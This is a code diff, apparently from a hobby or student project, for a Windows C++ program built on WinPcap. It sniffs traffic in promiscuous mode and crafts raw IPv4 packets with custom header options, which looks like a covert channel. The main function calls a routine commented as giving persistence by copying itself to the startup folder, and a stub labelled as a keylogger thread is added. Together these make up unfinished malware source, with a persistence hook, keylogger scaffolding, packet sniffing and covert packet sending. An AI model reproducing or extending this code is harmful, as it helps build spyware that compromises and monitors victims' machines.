@@ -11,9 +11,14 @@
 #include <vector>
 #include <pcap.h>
 #include <bitset>
+#include <IPHlpApi.h>
+
+#define MAX_THREADS 2
+CRITICAL_SECTION HandleLock;
 
 //specify WinSock lib or else symbols will not match
 #pragma comment(lib,"ws2_32.lib") //WinSock lib
+#pragma comment(lib, "IPHLPAPI.lib") //IP Helper lib
 
 //contains the dns packet data
 typedef struct dns_payload {
@@ -21,6 +26,16 @@ typedef struct dns_payload {
 	u_char junk;
 	u_char junk2;
 }dns_payload;
+
+//contains the values of mac address as integers
+typedef struct mac_values {
+	int value0;
+	int value1;
+	int value2;
+	int value3;
+	int value4;
+	int value5;
+}mac_values;
 
 // 4 bytes IP addresses
 typedef struct ip_address {
@@ -296,6 +311,43 @@ int size_of_list(pcap_if_t*  list) {
 }
 
 /*
+*This function returns the device to capture on
+*returns: device if successful otherwise returns NULL
+*/
+pcap_t* get_handle(pcap_if_t** first_device) {
+	pcap_if_t* all_devices;				//first point of interface list
+	char error_msg[PCAP_ERRBUF_SIZE];	//error message buffer
+
+										//returns on error
+	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &all_devices, error_msg) == -1) {
+		std::cout << "did not get device list" << std::endl;
+		return NULL;
+	}
+
+	//returns if no interfaces
+	if (size_of_list(all_devices) == 0) {
+		return NULL;
+	}
+
+	//select interface
+	//In this case inteface selected is the second interface
+	pcap_if_t* device = all_devices;
+	if (device != NULL) {
+		char error_msg[PCAP_ERRBUF_SIZE];	//error message buffer
+		pcap_t* adhandle;					//stores the handle created by pcap_open for pcap_next_ex to read packets
+
+		if ((adhandle = pcap_open(device->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, error_msg)) == NULL) {
+			pcap_freealldevs(device);
+			return NULL;
+		}
+		(*first_device) = all_devices;
+		return adhandle;
+	}
+
+	return NULL;
+}
+
+/*
  *This function will decapsulate packets
  *and call functions if needed
  *renturns nothing 
@@ -305,17 +357,16 @@ void decapsulate(const u_char *data, int size) {
 	eth_hdr = (eth_header*)data;
 	IPv4* ih;
 	u_int head_len;
-	//tcp_head* th;
-	udp_header* uh;
+	tcp_head* th;
+	//udp_header* uh;
 	u_short sport;
 	u_short dport;
-	dns_header* dns_h;
-	dns_payload* dns_pay;
 
 	if (ntohs(eth_hdr->type) == 0x800) {
 		// retireve the position of the ip header
 		ih = (IPv4 *)(data + 14); //length of ethernet header
-
+		int length = (int)ih->ver_ihl - 64;
+		
 		// print ip addresses
 		printf("%d.%d.%d.%d -> %d.%d.%d.%d\n",
 			ih->saddr.byte1,
@@ -328,51 +379,20 @@ void decapsulate(const u_char *data, int size) {
 			ih->daddr.byte4);
 
 		//get tcp header
-		/*ip_head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
-		th = (tcp_head *)((u_char*)ih + ip_head_len);*/
+		head_len = (ih->ver_ihl & 0xf) * 4;			//length of ip header
+		th = (tcp_head *)((u_char*)ih + head_len);
 
 		//get udp header = pointer + length of ipheader
-		head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
-		uh = (udp_header *)((u_char*)ih + head_len);
+		/*head_len = (ih->ver_ihl & 0xf) * 4;//length of ip header
+		uh = (udp_header *)((u_char*)ih + head_len);*/
 
 		//convert form network byte order to host byte order
-		sport = ntohs(uh->sport);
-		dport = ntohs(uh->dport);
+		std::cout << (int)th->flag << std::endl;
+		sport = ntohs(th->sport);
+		dport = ntohs(th->dport);
 
 		std::cout << "source " << sport << "dest " << dport << "length " << head_len << std::endl;
 
-		//dns header = point + udp header
-		head_len = 8; //standard length of udp header is 8 bytes
-		dns_h = (dns_header *)((u_char*)uh + head_len);
-
-		//std::cout << "Identifier " << dns_h->identifier << std::endl;
-		printf("Identifier %2.2x", dns_h->identifier);
-		//determine if the packet is a response or request
-		std::bitset<16> id(dns_h->flags_codes);
-		std::cout << "QR: " << id[7] << std::endl;//bytes swap lsb
-		if (id[7] == 1) {
-			//dns payload= pointer + dns header size
-			head_len = 12;
-			dns_pay = (dns_payload *)((u_char*)dns_h + head_len);
-
-			u_char* domain_char = (u_char*)dns_h + head_len;
-			u_int index = 0;
-			//loop to the end of question field
-			while (*domain_char != 0) {
-				domain_char = (u_char*)dns_h + head_len + index;
-				std::cout << domain_char << std::endl;
-				index++;
-			}
-			std::cout << index << std::endl;
-			u_char* type = (u_char*)dns_pay + index +1;//grab least sign bit
-			int lsb = (int)*type;
-			type = type - 1;//grab most sig bit
-			int msb = (int)*type;
-			msb = msb * 256;
-			int type_val = msb + lsb;
-			std::cout << "Type: " << type_val << std::endl;
-			//Use value returned by type for messages
-		}
 	}
 }
 
@@ -405,17 +425,233 @@ pcap_if_t* capture_em_packets() {
 }
 
 /*
- *
- */
-int main()
-{
-	//Implements persistence by copying itself to startup folder
-	//redirect output into stdout to buffer via pipe
-	startup_finder();
+*This function will get the mac address of the local machine
+*and enter it into a values struct
+*returns: the mac address of local machine in values struct
+*/
+void get_mac(mac_values** values) {
+	IP_ADAPTER_INFO *info = NULL, *pos;
+	DWORD size = 0;
 
+	GetAdaptersInfo(info, &size);
+	info = (IP_ADAPTER_INFO *)malloc(size);
+	GetAdaptersInfo(info, &size);
+
+	pos = info;
+	if (pos != NULL) {
+		/////////interate over adapters///////////////
+		(*values)->value0 = pos->Address[0];
+		for (u_int i = 1; i < pos->AddressLength; i++) {
+			//printf("%2.2x", pos->Address[i]);
+			switch (i) {
+			case 1:
+				(*values)->value1 = pos->Address[1];
+				break;
+			case 2:
+				(*values)->value2 = pos->Address[2];
+				break;
+			case 3:
+				(*values)->value3 = pos->Address[3];
+				break;
+			case 4:
+				(*values)->value4 = pos->Address[4];
+				break;
+			case 5:
+				(*values)->value5 = pos->Address[5];
+				break;
+			default:
+				break;
+			}
+		}
+	}
+	free(info);
+}
+
+/*
+*Finds lines that contain ipv4 addresses
+*returns: ipv4 addresses inside vector
+*/
+void ipv4_address(std::vector<std::string>& lines_vect, std::vector<std::string>& ip_addresses) {
+	std::size_t found;
+
+	for (int i = 0; i < lines_vect.size(); i++) {
+		found = lines_vect[i].find("IPv4");
+		if (found != std::string::npos) {
+			std::vector<std::string> name_ip;
+			std::vector<std::string> space_ip;
+			split(lines_vect[i], ':', name_ip);
+			split(name_ip[1], ' ', space_ip);
+			ip_addresses.push_back(space_ip[1]);
+		}
+	}
+
+}
+
+/*
+*This function will get the ip address of the current machine
+*returns: ip_addr struct
+*/
+void get_ip(std::vector<std::string>& ip_addresses) {
+	//take address from captured response
+	const char* cmd = "ipconfig";
+	char buffer[128];
+	std::string result = "";
+	std::vector<std::string> lines;
+	FILE* _pipe = _popen(cmd, "r");
+
+	//redirects stdout to pipe and adds elements of buffer to result string
+	if (!_pipe) {
+		std::cout << "ERROR" << std::endl;
+	}
+
+	while (!feof(_pipe)) {
+		if (fgets(buffer, 128, _pipe) != NULL)
+			result += buffer;
+	}
+	_pclose(_pipe);
+
+	split(result, '\n', lines);
+	ipv4_address(lines, ip_addresses);
+}
+
+/*
+*Used to send ip packets
+*returns: success of packet being sent
+*/
+int send_packet(std::string address, std::string mac_addr, std::string option) {
+	mac_values* values = (mac_values*)malloc((sizeof(int) * 6));
+	mac_values* mac_address = (mac_values*)malloc((sizeof(int) * 6));
+	get_mac(&values);
+	u_char packet[42];
+
+	std::vector<std::string> mac_val;
+	split(mac_addr, ':', mac_val);
+	mac_address->value0 = atoi(mac_val[0].c_str());
+	mac_address->value1 = atoi(mac_val[1].c_str());
+	mac_address->value2 = atoi(mac_val[2].c_str());
+	mac_address->value3 = atoi(mac_val[3].c_str());
+	mac_address->value4 = atoi(mac_val[4].c_str());
+	mac_address->value5 = atoi(mac_val[5].c_str());
+
+	//destination mac address
+	packet[0] = mac_address->value0;
+	packet[1] = mac_address->value1;
+	packet[2] = mac_address->value2;
+	packet[3] = mac_address->value3;
+	packet[4] = mac_address->value4;
+	packet[5] = mac_address->value5;
+	//source mac address
+	packet[6] = values->value0;
+	packet[7] = values->value1;
+	packet[8] = values->value2;
+	packet[9] = values->value3;
+	packet[10] = values->value4;
+	packet[11] = values->value5;
+	free(values);
+
+	//ethernet type IPv4
+	packet[12] = 8;
+	packet[13] = 0;
+	//version field and IHL
+	int size = 0;
+	if (option == "1") {
+		packet[14] = 70;
+		size = 38;
+		//need to set option length
+		for (int i = 34; i < 38; i++) {
+			packet[i] = i % 256;
+		}
+	}
+	else if (option == "2") {
+		packet[14] = 71;
+		size = 42;
+		//need to set option length
+		for (int i = 34; i < 42; i++) {
+			packet[i] = i % 256;
+		}
+	}
+	else
+		packet[14] = 69; //64 represents 4=>IPv4  5 represents minimum ipv4 length
+						 //differentiated services
+	packet[15] = 0;
+	//total length =1500
+	packet[16] = 5;
+	packet[17] = 220;
+	//identification =19142
+	packet[18] = 74;
+	packet[19] = 198;
+	//flags don't fragment =010
+	packet[20] = 64;
+	//fragment offset
+	packet[21] = 0;
+	//TTL
+	packet[22] = 255;
+	//layer 4 protocol
+	packet[23] = 17;  //must be set to detect layer 4 protocols
+					  //header checksum
+	packet[24] = 39;
+	packet[25] = 50;
+
+	//getting all ip addresses from ipconfig command
+	std::vector<std::string> ip_addresses;
+	get_ip(ip_addresses);
+	ip_address* ip_addr = (ip_address*)malloc((sizeof(int) * 4));
+	ip_address* dest_addr = (ip_address*)malloc((sizeof(int) * 4));
+	//source address
+	std::vector<std::string> octets;
+	split(ip_addresses[0], '.', octets);
+	ip_addr->byte1 = atoi(octets[0].c_str());
+	ip_addr->byte2 = atoi(octets[1].c_str());
+	ip_addr->byte3 = atoi(octets[2].c_str());
+	ip_addr->byte4 = atoi(octets[3].c_str());
+
+	//destination address
+	std::vector<std::string> octs;
+	split(address, '.', octs);
+	dest_addr->byte1 = atoi(octs[0].c_str());
+	dest_addr->byte2 = atoi(octs[1].c_str());
+	dest_addr->byte3 = atoi(octs[2].c_str());
+	dest_addr->byte4 = atoi(octs[3].c_str());
+
+	//source ip address
+	packet[26] = ip_addr->byte1;
+	packet[27] = ip_addr->byte2;
+	packet[28] = ip_addr->byte3;
+	packet[29] = ip_addr->byte4;
+	//destination ip address
+	packet[30] = dest_addr->byte1;
+	packet[31] = dest_addr->byte2;
+	packet[32] = dest_addr->byte3;
+	packet[33] = dest_addr->byte4;
+	free(ip_addr);
+
+	/* Send the packet */
+	EnterCriticalSection(&HandleLock);
+	pcap_if_t* first_device;
+	pcap_t* fp = get_handle(&first_device);
+	if (fp == NULL) {
+		LeaveCriticalSection(&HandleLock);
+		return -1;
+	}
+	if (pcap_sendpacket(fp, packet, size /* size */) != 0)
+	{
+		std::cout << "\nError sending the packet: \n" << pcap_geterr(fp) << std::endl;
+		LeaveCriticalSection(&HandleLock);
+		return -1;
+	}
+	LeaveCriticalSection(&HandleLock);
+
+	return 0;
+}
+
+/*
+ *This is the capture thread
+ *returns:
+ */
+DWORD WINAPI capture(PVOID pPARAM) {
 	//captures packets using winpcap driver
 	pcap_if_t* device = capture_em_packets();//device is pointer to list of devices
-	
+
 	pcap_t* adhandle;					//stores the handle created by pcap_open for pcap_next_ex to read packets
 	struct pcap_pkthdr *pktHeader;		//stores packet header information
 	const u_char *pkt_data;				//stores packet data
@@ -423,7 +659,7 @@ int main()
 	struct bpf_program opcode;			//this will contain useful shit
 	u_int netmask;						//this will contain the netmask of the interface capturing
 
-	//open dev list
+										//open dev list
 	if ((adhandle = pcap_open(device->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, NULL, error_msg)) == NULL) {
 		pcap_freealldevs(device);
 		return -1;
@@ -448,14 +684,45 @@ int main()
 	//capture packets on dev
 	/////////infinite loop need to change///////////
 	while (pcap_next_ex(adhandle, &pktHeader, &pkt_data) >-1) {
-		
+
 		//inspect packet
 		if (pktHeader->len > 0) {
 			decapsulate(pkt_data, pktHeader->caplen);
 		}
 	}
 	///////////////////////////////////////////////
+	return 0;
+}
 
-    return 0;
+/*
+ *This will run the key logger
+ *returns:
+ */
+DWORD WINAPI keg_logging(PVOID pPARAM) {
+	return 0;
+}
+
+/*
+ *
+ */
+int main()
+{
+	//Implements persistence by copying itself to startup folder
+	//redirect output into stdout to buffer via pipe
+	startup_finder();
+
+	InitializeCriticalSection(&HandleLock);
+
+	//trying the multithreaded prog
+	DWORD id;
+	HANDLE hCapture = CreateThread(NULL, 0, capture, (PVOID)1, 0, &id);
+	//HANDLE hSender = CreateThread(NULL, 0, command_console, (PVOID)2, 0, &id);
+
+	//Wait for objects
+	//WaitForSingleObject(hSender, INFINITE);
+
+	int temp = 0;
+	std::cin >> temp;
+	return 0;
 }
 
